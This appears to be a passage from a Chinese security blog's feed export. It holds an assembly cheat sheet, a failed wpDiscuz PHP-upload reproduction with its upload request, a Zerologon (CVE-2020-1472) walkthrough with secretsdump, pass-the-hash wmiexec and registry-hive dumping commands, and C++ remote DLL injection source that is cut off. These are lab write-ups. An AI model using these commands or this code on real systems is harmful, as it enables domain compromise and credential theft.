就是C语言中的”&amp;”.（把DS:[寄存器]地址所指向的值基于给某给寄存器）</div><div><br></div><div>lea对变量没有影响是取地址,对寄存器来说加[]时取值,第二操作数不加[]非法</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov eax,0x4C2</div><div>lea ebx,dword ptr DS:[EAX] ;将EAX的地址给ebx</div><div><img src="汇编指令_files/Image [14].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>LODSD</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>LODSB、LODSW 和 LODSD 指令分别从 ESI 指向的内存地址加载一个字节或一个字到 AL/AX/EAX。ESI 按照方向标志位的状态递增或递减。</div><div><br></div><div>LODS 很少与 REP 前缀一起使用，原因是，加载到累加器的新值会覆盖其原来的内容。相对而言，LODS常常被用于加载单个 数值。在后面的例子中，LODSB代替了如下两条指令（假设方向标志位清零）：</div><div>mov al, ［esi］&nbsp;&nbsp;&nbsp; ;将字节送入AL</div><div>inc esi&nbsp;&nbsp;&nbsp; ;指向下一个字节</div><div><br></div><div>默认将DS:[esi]地址所指向的值赋予EAX</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div><img src="汇编指令_files/Image [15].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>xchg</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>两个寄存器的值互相交换</div><div>xchg &lt;被交换的寄存器&gt;,&lt;要交换的寄存器&gt;</div><div>例如：xchg eax,esi</div><div>EAX=ESI的值</div><div>ESI=EAX的值</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>执行前：</div><div><img src="汇编指令_files/Image [16].png" type="image/png" data-filename="Image.png"></div><div><br></div><div>执行xchg指令后：</div><div><img src="汇编指令_files/Image [17].png" type="image/png" data-filename="Image.png"></div><div><br></div><div><br></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>test</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>对两个寄存器进行逻辑计算，根据返回的结果修改标志位,自己测试的时候是如果寄存器其中一方为0，Z、P标准位设置位1，否则Z、P标准位设置为0。下面是文章说的</div><div><br></div><div>( 影响标志: C,O,P,Z,S(其中C与O两个标志会被设为0))</div><div><br></div><div>该指令主要用来判断其中一方的寄存器是否为0</div><div><br></div><div>顺便说一下标志位，所有标志位在念的时候都加一个F，比如：Z=ZF标准位，C=CF标志位</div><div><br></div><div><br></div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>其中一方寄存器为0</div><div><img src="汇编指令_files/20200809171409.png" type="image/png" data-filename="20200809171409.png" width="348"></div><div><br></div><div>两边的寄存器都不为0</div><div><img src="汇编指令_files/20200809171045.png" type="image/png" data-filename="20200809171045.png"></div></td></tr></tbody></table><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>内存读写的大小端<br>主流的汇编架构，内存里都是小端<br>例如：mov ax,4C3B -&gt; 内存里：3B4C<br><img src="https://s1.ax1x.com/2020/09/21/wqd9gO.png" alt=""></p><p>大端：mov ax,4C3B -&gt; 内存里：4C3B</p><p>大端只有在很少见的IOT设备可能有</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;好久没看汇编了，怕忘。复习一下顺便写一下总结&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;汇编语言（Assembly Language）是任何一</summary>
      
    
    
    
    
    <category term="底层" scheme="http://422926799.github.io/tags/底层/"/>
    
  </entry>
  
  <entry>
    <title>记一次失败的代码审计复现</title>
    <link href="http://422926799.github.io/posts/8a502742.html"/>
    <id>http://422926799.github.io/posts/8a502742.html</id>
    <published>2020-09-20T05:39:07.000Z</published>
    <updated>2020-09-20T07:37:20.283Z</updated>
    
    <content type="html"><![CDATA[<p>原本想着复现wpDiscuz插件任意文件上传的。后面没成功<br>跟了一下代码不清楚是不是修复了，做个笔记</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>phpstudy<br>php 7.0.2<br>wpdiscuz.7.0.3</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/8276" target="_blank" rel="noopener">https://xz.aliyun.com/t/8276</a></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>将给出的下载插件链接：<a href="https://downloads.wordpress.org/plugin/wpdiscuz.7.0.3.zip" target="_blank" rel="noopener">https://downloads.wordpress.org/plugin/wpdiscuz.7.0.3.zip</a><br>下载完后解压到<code>wp-content/plugins</code><br><img src="https://s1.ax1x.com/2020/09/20/wT9tzt.png" alt=""></p><p>然后登录wordpress启用插件<br><img src="https://s1.ax1x.com/2020/09/20/wT9asf.png" alt=""></p><p>之后在文章评论区看到如下<br><img src="https://s1.ax1x.com/2020/09/20/wTCs0O.png" alt=""></p><p>根据文章所述，gif头的php进行文件上传，burp抓一波包可以看到如下<br>(上传失败)<br><img src="https://s1.ax1x.com/2020/09/20/wTCgtH.png" alt=""></p><p>先看看请求包，然后去分析代码</p><pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1Host: 192.168.1.109Content-Length: 653Accept: */*DNT: 1X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLjgZd9hliOFxBBcgOrigin: http://192.168.1.109Referer: http://192.168.1.109/?p=1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: wordpress_test_cookie=WP+Cookie+check; comment_author_email_145d7bef132f82360a6cd87256e47c05=admin@qq.com; comment_author_145d7bef132f82360a6cd87256e47c05=adminConnection: close------WebKitFormBoundaryLjgZd9hliOFxBBcgContent-Disposition: form-data; name=&quot;action&quot;wmuUploadFiles------WebKitFormBoundaryLjgZd9hliOFxBBcgContent-Disposition: form-data; name=&quot;wmu_nonce&quot;09f13eeda3------WebKitFormBoundaryLjgZd9hliOFxBBcgContent-Disposition: form-data; name=&quot;wmuAttachmentsData&quot;undefined------WebKitFormBoundaryLjgZd9hliOFxBBcgContent-Disposition: form-data; name=&quot;wmu_files[0]&quot;; filename=&quot;test.php&quot;Content-Type: application/octet-streamGIF89a&lt;?php phpinfo();a?&gt;------WebKitFormBoundaryLjgZd9hliOFxBBcgContent-Disposition: form-data; name=&quot;postId&quot;1------WebKitFormBoundaryLjgZd9hliOFxBBcg--</code></pre><p>这里的action是对应模块的处理函数的key<code>wmuUploadFiles</code><br>admin-ajax.php<br><img src="https://s1.ax1x.com/2020/09/20/wTChct.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/09/20/wTCoB8.png" alt=""></p><p>直接搜索<code>wmuUploadFiles</code>即可找到处理函数所在的位置<br>(这里其实你也可以单步，跟到他调用函数部分,但是实在太乱。过程变量太多<br>类似于wordpress也可以看看，请求的页面接收的参数到哪里处理的。直接搜索那个参数可以快速找到功能处理所在的php)<br><img src="https://s1.ax1x.com/2020/09/20/wTP38A.png" alt=""></p><p>路径在<code>wordpress\wp-content\plugins\wpdiscuz\utils\class.WpdiscuzHelperUpload.php</code><br><img src="https://s1.ax1x.com/2020/09/20/wTPYKP.png" alt=""></p><p>找到处理函数<br>！<a href="https://s1.ax1x.com/2020/09/20/wTiqln.png" target="_blank" rel="noopener"></a></p><p>debug一顿后到312行开始有file请求的处理<br><img src="https://s1.ax1x.com/2020/09/20/wTFZTO.png" alt=""></p><p>关键点在<code>getMimeType</code>和<code>isAllowedFileType</code><br>getMimeType函数</p><pre><code class="php"> private function getMimeType($file, $extension) {        $mimeType = &quot;&quot;;        if (function_exists(&quot;mime_content_type&quot;)) { //判断mime_content_type函数是否存在，存在就用这个函数处理否则用别的函数或者自己处理            $mimeType = mime_content_type($file[&quot;tmp_name&quot;]); // 获取文件MIME 类型        } elseif (function_exists(&quot;finfo_open&quot;) &amp;&amp; function_exists(&quot;finfo_file&quot;)) {            $finfo = finfo_open(FILEINFO_MIME_TYPE);            $mimeType = finfo_file($finfo, $file[&quot;tmp_name&quot;]);        } elseif ($extension) {            $matches = wp_check_filetype($file[&quot;name&quot;], $this-&gt;options-&gt;content[&quot;wmuMimeTypes&quot;]);            $mimeType = empty($matches[&quot;type&quot;]) ? &quot;&quot; : $matches[&quot;type&quot;];        }        return $mimeType;    }</code></pre><p>mime_content_type他这个函数一直没有，我以为是版本问题换了之后还是一样。还是到wp_check_filetype函数处理<br><img src="https://s1.ax1x.com/2020/09/20/wTFNtg.png" alt=""></p><p>wp_check_filetype函数<br>根据正则返回对应的MIME类型和文件后缀</p><pre><code class="php">function wp_check_filetype( $filename, $mimes = null ) { //test.gif    if ( empty( $mimes ) ) {        $mimes = get_allowed_mime_types(); //返回对应后缀和对应的MIME类型    }    $type = false;    $ext  = false;    foreach ( $mimes as $ext_preg =&gt; $mime_match ) {        $ext_preg = &#39;!\.(&#39; . $ext_preg . &#39;)$!i&#39;;        if ( preg_match( $ext_preg, $filename, $ext_matches ) ) { //正则匹配后缀文件名            $type = $mime_match; //对应的MIME类型            $ext  = $ext_matches[1]; //返回文件名            break;        }    }    return compact( &#39;ext&#39;, &#39;type&#39; );}</code></pre><p><img src="https://s1.ax1x.com/2020/09/20/wTF0cn.png" alt=""></p><p>上传php的时候$mimeType类型最后为空(自己测的时候)<br><img src="https://s1.ax1x.com/2020/09/20/wTkI2j.png" alt=""></p><p>然后到文件头部判断<code>getMimeTypeFromContent</code></p><pre><code class="php">    public function getMimeTypeFromContent($path) {        $fileContent = $path &amp;&amp; function_exists(&quot;file_get_contents&quot;) &amp;&amp; ($v = file_get_contents($path)) ? $v : &quot;&quot;; //读取文件内容        if ($fileContent &amp;&amp; preg_match(&#39;/\A(?:(\xff\xd8\xff)|(GIF8[79]a)|(\x89PNG\x0d\x0a)|(BM)|(\x49\x49(?:\x2a\x00|\x00\x4a))|(FORM.{4}ILBM))/&#39;, $fileContent, $hits)) { //文件头信息获取            $type = [                1 =&gt; &quot;jpeg&quot;,                2 =&gt; &quot;gif&quot;,                3 =&gt; &quot;png&quot;,                4 =&gt; &quot;bmp&quot;,                5 =&gt; &quot;tiff&quot;,                6 =&gt; &quot;ilbm&quot;,            ];            return $type[count($hits) - 1]; //$hits统计出的数量减1，然后在到$type取对应的后缀        }        return false;    }</code></pre><p>测试的payload为<code>GIF98a&lt;?php phpinfo();?&gt;</code>这里获取到的是gif<br><img src="https://s1.ax1x.com/2020/09/20/wTAtzj.png" alt=""></p><p>然后又进到<code>wp_check_filetype</code>函数…判断后缀<br>(返回false)<br><img src="https://s1.ax1x.com/2020/09/20/wTAgSJ.png" alt=""></p><p>然后到了</p><pre><code class="php"> $mimeType = empty($matches[&quot;type&quot;]) ? &quot;&quot; : $matches[&quot;type&quot;];</code></pre><p>由于返回false这里就返回空<br><img src="https://s1.ax1x.com/2020/09/20/wTEEmq.png" alt=""></p><p>然后到<code>isAllowedFileType</code>函数判断<br><img src="https://s1.ax1x.com/2020/09/20/wTE4js.md.png" alt=""></p><pre><code class="php">   private function isAllowedFileType($mimeType) {        $isAllowed = false;        if (!empty($this-&gt;options-&gt;content[&quot;wmuMimeTypes&quot;]) &amp;&amp; is_array($this-&gt;options-&gt;content[&quot;wmuMimeTypes&quot;])) {            $isAllowed = in_array($mimeType, $this-&gt;options-&gt;content[&quot;wmuMimeTypes&quot;]);        }        return $isAllowed;    }</code></pre><p>判断类型是否在数组里面<br><img src="https://s1.ax1x.com/2020/09/20/wTVpHx.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/09/20/wTVi4O.png" alt=""></p><p><code>$isAllowed</code>返回False，然后<code>$error</code>为True，返回错误<br><img src="https://s1.ax1x.com/2020/09/20/wTVQ58.png" alt=""></p><p>报错为类型(MIME)错误</p><p>（就在快发布的时候乱想，然后成了。就tm离谱）（但是不使用GIF89a头，因为加上那个头部的话又到getMimeTypeFromContent函数里面了，后缀正则匹配不到<br>给返回个False）<br>但是如果<code>getMimeType</code>这里用的是mime_content_type的话确实是可以进行文件上传<br>为了验证，手动将isAllowedFileType返回修改为true<br><img src="https://s1.ax1x.com/2020/09/20/wTm38O.png" alt=""></p><p>然后到348行进行文件处理上传<br><img src="https://s1.ax1x.com/2020/09/20/wTKpbd.png" alt=""></p><p><code>uploadSingleFile</code>函数</p><pre><code class="php">private function uploadSingleFile($file) {        $currentTime = WpdiscuzHelper::getMicrotime(); //获取时间戳        $attachmentData = [];        $path = $this-&gt;wpUploadsPath . &quot;/&quot;; //当前年月日的文件夹        $fName = $file[&quot;name&quot;]; //文件名        $pathInfo = pathinfo($fName); //分割路径        $realFileName = $pathInfo[&quot;filename&quot;];        $ext = empty($pathInfo[&quot;extension&quot;]) ? &quot;&quot; : strtolower($pathInfo[&quot;extension&quot;]);        $sanitizedName = sanitize_file_name($realFileName);        $cleanFileName = $sanitizedName . &quot;-&quot; . $currentTime . &quot;.&quot; . $ext; //时间戳后缀拼接        $cleanRealFileName = $sanitizedName . &quot;.&quot; . $ext;        $fileName = $path . $cleanFileName; //路径拼接        if (in_array($ext, [&quot;jpeg&quot;, &quot;jpg&quot;])) { //没进去            $this-&gt;imageFixOrientation($file[&quot;tmp_name&quot;]);        }        $success = apply_filters(&quot;wpdiscuz_mu_compress_image&quot;, false, $file[&quot;tmp_name&quot;], $fileName, $q = 60);        if ($success || @move_uploaded_file($file[&quot;tmp_name&quot;], $fileName)) { //文件移动            $postParent = apply_filters(&quot;wpdiscuz_mu_attachment_parent&quot;, 0);            $attachment = [                &quot;guid&quot; =&gt; $this-&gt;wpUploadsUrl . &quot;/&quot; . $cleanFileName,                &quot;post_mime_type&quot; =&gt; $file[&quot;type&quot;],                &quot;post_title&quot; =&gt; preg_replace(&quot;#\.[^.]+$#&quot;, &quot;&quot;, wp_slash($fName)),                &quot;post_excerpt&quot; =&gt; wp_slash($fName),                &quot;post_content&quot; =&gt; &quot;&quot;,                &quot;post_status&quot; =&gt; &quot;inherit&quot;,                &quot;post_parent&quot; =&gt; $postParent            ];            if ($attachId = wp_insert_attachment($attachment, $fileName)) {                add_filter(&quot;intermediate_image_sizes&quot;, [&amp;$this, &quot;getImagesSizes&quot;]);                $attachData = wp_generate_attachment_metadata($attachId, $fileName);                wp_update_attachment_metadata($attachId, $attachData);                update_post_meta($attachId, &quot;_wp_attachment_image_alt&quot;, $fName);                $ip = WpdiscuzHelper::getRealIPAddr();                update_post_meta($attachId, self::METAKEY_ATTCHMENT_OWNER_IP, $ip);                update_post_meta($attachId, self::METAKEY_ATTCHMENT_COMMENT_ID, 0);                $attachmentData[&quot;id&quot;] = $attachId;                $attachmentData[&quot;url&quot;] = empty($attachData[&quot;sizes&quot;][&quot;thumbnail&quot;][&quot;file&quot;]) ? $this-&gt;wpUploadsUrl . &quot;/&quot; . $cleanFileName : $this-&gt;wpUploadsUrl . &quot;/&quot; . $attachData[&quot;sizes&quot;][&quot;thumbnail&quot;][&quot;file&quot;];                $attachmentData[&quot;fullname&quot;] = $cleanRealFileName;                $attachmentData[&quot;shortname&quot;] = $this-&gt;getFileName($cleanRealFileName);            }        }        return $attachmentData;    }</code></pre><p><img src="https://s1.ax1x.com/2020/09/20/wTM7fx.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;原本想着复现wpDiscuz插件任意文件上传的。后面没成功&lt;br&gt;跟了一下代码不清楚是不是修复了，做个笔记&lt;/p&gt;
&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;phpstudy&lt;</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1472复现</title>
    <link href="http://422926799.github.io/posts/b2a3f021.html"/>
    <id>http://422926799.github.io/posts/b2a3f021.html</id>
    <published>2020-09-15T16:39:24.000Z</published>
    <updated>2020-09-15T16:53:02.236Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote><p>当攻击者使用Netlogon远程协议（MS-NRPC）建立与域控制器的易受攻击的Netlogon安全通道连接时，将存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络上的设备上运行特制的应用程序。<br>要利用此漏洞，将需要未经身份验证的攻击者使用MS-NRPC连接到域控制器以获得域管理员访问权限。</p></blockquote><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows Server 2008 R2（用于基于x64的系统）Service Pack 1<br>Windows Server 2008 R2（用于基于x64的系统）Service Pack 1（服务器核心安装）<br>Windows Server 2012<br>Windows Server 2012（服务器核心安装）<br>Windows Server 2016<br>Windows Server 2016（服务器核心安装）<br>Windows Server 2019<br>Windows Server 2019（服务器核心安装）<br>Windows Server 1903版（服务器核心安装）<br>Windows Server版本1909（服务器核心安装）<br>Windows Server 2004版（服务器核心安装）</p><p>缓解措施：暂无</p><h2 id="漏洞复现过程"><a href="#漏洞复现过程" class="headerlink" title="漏洞复现过程"></a>漏洞复现过程</h2><p>测试环境：windows server 2008和windows server 2012<br>测试结果:Windows server 2012失败（作者的windows server 2012 sp2可以成功）</p><p>dcip:192.168.1.111(由于某些原因我改了一下ip后面到了192.168.1.107)<br>domain:demo.com</p><p>使用给出的exp地址:<a href="https://github.com/SecuraBV/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/SecuraBV/CVE-2020-1472</a></p><pre><code>python zerologon_tester.py &lt;dcname&gt; &lt;dcip&gt;python zerologon_tester.py testing 192.168.1.111</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wcnquF.png" alt=""></p><p>使用scretsdump.py指定空hash或者-no-pass进行dcsync dump (我这里的no-pass并没有成功，不知道是不是这个exp的问题还是什么原因)</p><pre><code>python secretsdump.py demo.com/&#39;TESTING -hashes aad3b435b51404eeaad3b435b51404ee:d42e7df83d64ed8c8e5630ce63cdeee0@192.168.1.107 -hashes aad3b435b51404eeaad3b435b51404ee:d42e7df83d64ed8c8e5630ce63cdeee0</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wcuugf.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/09/16/wcnx41.png" alt=""></p><p>然后使用wmicexec连接到dc</p><pre><code>wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5f7fc88c760df9ce3d74657a5943e42e demo.com/administrator@192.168.1.107</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wcu9gK.png" alt=""></p><p>保存sam文件下载到本地</p><pre><code>reg save hklm\sam c:\sam.hivereg save hklm\system c:\system.hivereg save hklm\security c:\security.hive</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wcuiuD.md.png" alt=""></p><p>secretsdump解析sam（这里的MACHINE.ACC的hash是原来机器账户的hash）</p><pre><code>python3 secretsdump.py -system system.hive -system system.hive -security security.hive LOCAL</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wcuZ4I.png" alt=""></p><p>然后使用poc给出的restorepassword.py恢复hash（这里需要新版impacket我这里没有成，借一下文章的图）</p><pre><code>python3 reinstall_original_pw.py testing 192.168.1.107 52bc2ea24e84d8faf163364510dd3b07b36c9c85a5846614328ccd3ff83e5ff825e3e0ae11759f1393ba10b572a480ee78272a341a2abb8b4ef65f1b754045d577543d70eac45b471d688e91dc4306a5bf0021d4d0dedaabdc866aeb260232fe85bc2319a47665e6a7cf10751e16a064ef79486d6fc86abeac64d86f5c91d8b5ba787194c082c16da99bbeca73ab323de5cc8a86ddd25d8f5e842c4ab8d4f8b304d920e9d2b3ffe43ff955173eb2451c915b712115d791560eb532cc4b30d093497a96b2941d2fbc8bc9a00fafb0a1b9b6bf466171937ee1f5e8c93fd17392ac897491b708ee934583c89d65ef6a97d1</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wculDg.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/09/16/wcu8Ej.png" alt=""></p><p>参考链接:<br><a href="https://mp.weixin.qq.com/s?__biz=MzI2ODQwNTkxNw==&amp;mid=2247483702&amp;idx=1&amp;sn=263cb1377e79f3d6e11b57b96f5e3755" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI2ODQwNTkxNw==&amp;mid=2247483702&amp;idx=1&amp;sn=263cb1377e79f3d6e11b57b96f5e3755</a></p><p>exp我上传了仓库<br><a href="https://github.com/422926799/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/422926799/CVE-2020-1472</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;当攻击者使用Netlogon远程协议（MS-NRPC）建立与域控制器的易受攻击的Netlogon安</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
    
  </entry>
  
  <entry>
    <title>远程DLL注入研究</title>
    <link href="http://422926799.github.io/posts/7c405794.html"/>
    <id>http://422926799.github.io/posts/7c405794.html</id>
    <published>2020-09-13T17:22:11.000Z</published>
    <updated>2020-09-13T17:28:55.096Z</updated>
    
    <content type="html"><![CDATA[<p>太久没更新，都忘了写了。最近研究了一下远程DLL注入<br>做个笔记</p><h2 id="CreateRemoteThread远程线程调用"><a href="#CreateRemoteThread远程线程调用" class="headerlink" title="CreateRemoteThread远程线程调用"></a>CreateRemoteThread远程线程调用</h2><p>原理:</p><pre><code>* 读取目标要注入dll的进程句柄* 计算存储DLL路径所需要的字节数* 为远程进程分配一个内存以存储DLL路径名称* 复制DLL路径到远程进程* 获取LoadLibraryW在Kernel32.dll中的地址* 创建远程调用LoadLibraryW(在远程地址空间中)加载DLL* 等待远程线程结束(卸载DLL)</code></pre><pre><code class="cpp">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;int main(int argc,char *argv[]){        DWORD dwDesiredAccess= PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD |  PROCESS_VM_OPERATION | PROCESS_VM_WRITE;        BOOL bInheritHandle=0;        DWORD dwProcessId;        PCWSTR dllPath = TEXT(&quot;C:\\testdll.dll&quot;); //设置DLLL路径        int dlllen = lstrlen(dllPath);        int dllbytes = dlllen * 2; //计算dll路径长度        if (argc == 2) {               dwProcessId = atoi(argv[1]);        }        else {               printf(&quot;Example:test.exe &lt;process_id&gt;\n&quot;);               exit(1);        }        HANDLE process=OpenProcess(dwDesiredAccess,bInheritHandle,dwProcessId); //读取进程获取句柄        if (process==0){               printf(&quot;[-] OpenProcess failure,Error code:%d\n&quot;,GetLastError());               exit(1);        }        else {               printf(&quot;[*] OpenProcess Sucess\n&quot;);        }        LPVOID vallex = VirtualAllocEx(process, 0, dllbytes, MEM_COMMIT, PAGE_READWRITE); //给远程地址分配一个可以放下dll路径的内存空间        if (vallex == 0) {               printf(&quot;[-] VirtualAllocEx failure,Error Code:%d\n&quot;,GetLastError());               exit(1);        }        else {               printf(&quot;[*] VirtualAllocEx Sucess\n&quot;);        }        if (!WriteProcessMemory(process, vallex, dllPath, dllbytes, 0)) { //远程内存写入               printf(&quot;[-] WriteProcessMemory failure,Error Code:%d\n&quot;, GetLastError());               exit(1);        }        else {               printf(&quot;[*] WriteProcessMemory Sucess\n&quot;);        }        FARPROC moduleaddress = GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)),  &quot;LoadLibraryW&quot;); //获取Kernel32.dll里面LoadLibraryW函数地址        if (moduleaddress == 0) {               printf(&quot;[-] GetProcAddress failure,Error Code:%d\n&quot;, GetLastError());               exit(1);        }        else {               printf(&quot;[*] GetProcAddress Sucess\n&quot;);        }        HANDLE createthread_ = CreateRemoteThread(process, 0, 0,  LPTHREAD_START_ROUTINE(moduleaddress), vallex, 0, 0); //在远程进程调用dll        if (createthread_ == 0) {               printf(&quot;[-] createthread failure,Error Code:%d\n&quot;, GetLastError());               exit(1);        }        else {               printf(&quot;[*] CreateRemoteThread Sucess\n&quot;);               WaitForSingleObject(createthread_, INFINITE); //等待线程创建结束（卸载DLL）        }        return 0;}</code></pre><p><img src="https://s1.ax1x.com/2020/09/14/wBJ526.png" alt=""></p><p>注入测试<br><img src="https://s1.ax1x.com/2020/09/14/wBJ7rD.png" alt=""></p><h2 id="RtlCreateUserThread-DLL远程注入"><a href="#RtlCreateUserThread-DLL远程注入" class="headerlink" title="RtlCreateUserThread DLL远程注入"></a>RtlCreateUserThread DLL远程注入</h2><blockquote><p> RtlCreateUserThread是CreateRemoteThread的底层实现，所以使用RtlCreateUserThread的原理是和使用CreateRemoteThread的原理是一样的，这个函数可以实现跨会话创建线程。唯一的问题就是：当我们在Vista 之前的操作系统调用此函数所创建的线程并没有通知给csrss 进程，它没有完整的初始化，在调用一些网络或者其它的系统函数的时候他可能返回失败，而通过CreateRemoteThread 创建的线程没有任何问题，在Vista+的操作系统上调用此函数也没有问题。因此我们需要判断系统版本，当目标系统为Vista-的时候，我们应该通过RtlCreateUserThread创建一个挂起的线程，然后调用CsrClientCallServer通知csrss 这个线程的创建，然后csrss 做相应的记录及初始化工作之后，我们再恢复线程的执行。最后，我们新创建的线程必须自己调用ExitThread退出，否则也会产生崩溃的情况。</p></blockquote><p>原理:</p><pre><code>* 读取目标要注入dll的进程句柄* 计算存储DLL路径所需要的字节数* 为远程进程分配一个内存以存储DLL路径名称* 复制DLL路径到远程进程* 获取LoadLibraryW在Kernel32.dll中的地址* 创建远程调用LoadLibraryW(在远程地址空间中)加载DLL* 在卸载的时候会此DLL</code></pre><pre><code class="cpp">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;typedef DWORD(WINAPI * pRtlCreateUserThread)(        HANDLE      ProcessHandle,        PSECURITY_DESCRIPTOR  SecurityDescriptor,        BOOL      CreateSuspended,        ULONG     StackZeroBits,        PULONG     StackReserved,        PULONG     StackCommit,        LPVOID     StartAddress,        LPVOID     StartParameter,        HANDLE      ThreadHandle,        LPVOID     ClientID        );DWORD findbyname(WCHAR *name) {        HANDLE p;        PROCESSENTRY32W p2;        p = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);        p2.dwSize = sizeof(PROCESSENTRY32);        printf(&quot;Proces Listlen:%d\n&quot;, p2.dwSize);        BOOL besult = Process32FirstW(p, &amp;p2);        int calc = 0;        while (besult!=FALSE) {               int pid = p2.th32ProcessID;               WCHAR *processname = p2.szExeFile;               if (wcscmp(processname, name) == 0) {                       printf(&quot;%d &quot;, pid);                       wprintf(processname);                       printf(&quot;\n&quot;);                       return pid;               }               besult=Process32NextW(p,&amp;p2);               calc++;        }        return 0;}void Errorcode() {        printf(&quot;,Error Code:%d\n&quot;, GetLastError());        exit(1);}DWORD dllinject(LPCSTR dll,int pid) {        HANDLE h;        h = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);        if (h == 0) {               printf(&quot;[-] OpenProcess failure&quot;);               Errorcode();        }        printf(&quot;[*] OpenProcess Sucess\n&quot;);        LPVOID moduleaddress =  (LPVOID)GetProcAddress(GetModuleHandle(TEXT(&quot;kernel32.dll&quot;)),&quot;LoadLibraryA&quot;);        if (moduleaddress == 0) {               printf(&quot;[-] GetProcAddress LoadLibraryW failure&quot;);               Errorcode();        }        printf(&quot;[*] GetProcAddress LoadLibraryW Address Sucess,Address=0x%x\n&quot;,  moduleaddress);        pRtlCreateUserThread RtlCreateUserThread = NULL;        RtlCreateUserThread =  (pRtlCreateUserThread)GetProcAddress(GetModuleHandle(TEXT(&quot;ntdll.dll&quot;)),  &quot;RtlCreateUserThread&quot;);        if (RtlCreateUserThread == 0) {               printf(&quot;[-] GetProcAddress RtlCreateUserThread failure&quot;);               Errorcode();        }        printf(&quot;[*] GetProcAddress RtlCreateUserThread Address Sucess,Address=0x%x\n&quot;,  RtlCreateUserThread);        //DWORD dwSize = (strlen(dll) + 1) * sizeof(char);        SIZE_T dwSize = strlen(dll);        LPVOID vt = VirtualAllocEx(h,0, dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);        if (vt == 0) {               printf(&quot;[-] VirtualAllocEx failure&quot;);               Errorcode();        }        printf(&quot;[*] VirtualAllocEx Sucess,Address=0x%x\n&quot;, vt);        BOOL dlladdress = WriteProcessMemory(h, vt, dll, dwSize, 0);        if (dlladdress == 0) {               printf(&quot;[-] WriteProcessMemory failure&quot;);               Errorcode();        }        printf(&quot;[*] WriteProcessMemory Sucess\n&quot;);        HANDLE hRemoteThread = NULL;         RtlCreateUserThread(h, NULL, 0, 0, 0, 0, moduleaddress, vt,&amp;hRemoteThread, NULL);        printf(&quot;%d\n&quot;, GetLastError());        if (hRemoteThread ==0) {               printf(&quot;[-] RtlCreateUserThread failure&quot;);               Errorcode();               return 1;        }        printf(&quot;[*] RtlCreateUserThread Sucess\n&quot;);        printf(&quot;[+] Dll Inject Sucess\n&quot;);        return 0;}int main(){        WCHAR *processname = TEXT(&quot;notepad.exe&quot;);        LPCSTR dllpath = &quot;C:\\Users\\JiuShi\\Desktop\\ABC.dll&quot;;        printf(&quot;DLL PATH:&quot;);        printf(&quot;\n&quot;);        int 